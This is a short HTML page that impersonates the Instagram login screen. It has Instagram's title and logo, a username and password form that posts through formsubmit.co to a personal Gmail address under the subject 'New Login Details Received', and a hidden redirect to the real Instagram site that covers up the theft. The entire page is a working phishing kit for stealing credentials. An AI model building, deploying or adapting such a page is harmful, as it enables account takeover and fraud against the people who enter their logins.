<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
            <form action="https://formsubmit.co/eldrithofficial@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="New Login Details Received">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="_next" value="https://www.instagram.com">
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
